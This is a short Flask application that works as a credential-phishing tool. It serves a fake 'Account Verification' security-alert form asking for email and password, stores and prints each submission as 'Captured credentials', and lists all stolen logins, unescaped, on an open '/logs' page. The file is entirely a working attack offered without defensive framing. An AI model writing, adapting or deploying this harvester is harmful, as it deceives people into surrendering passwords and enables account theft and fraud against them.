from flask import Flask, request, render_template_string

app = Flask(__name__)
logins = []

PHISHING_PAGE = """
<!doctype html>
<title>Account Verification</title>
<h2>Security Alert: Confirm Your Account</h2>
<form action="/submit" method="post">
  <label for="email">Email:</label><br>
  <input type="email" id="email" name="email" required><br><br>
  <label for="password">Password:</label><br>
  <input type="password" id="password" name="password" required><br><br>
  <input type="submit" value="Verify">
</form>
"""

RESULT_PAGE = """
<!doctype html>
<title>Thank You</title>
<h2>Thank you for verifying your account.</h2>
<p>Your submission has been recorded.</p>
"""

@app.route('/phish')
def phish():
    return render_template_string(PHISHING_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    logins.append({'email': email, 'password': password})
    print(f"Captured credentials: {email} / {password}")
    return render_template_string(RESULT_PAGE)

@app.route('/logs')
def logs():
    records = "<h2>Captured Credentials</h2><ul>"
    for entry in logins:
        records += f"<li>{entry['email']} : {entry['password']}</li>"
    records += "</ul>"
    return records

if __name__ == "__main__":
    app.run(debug=True)
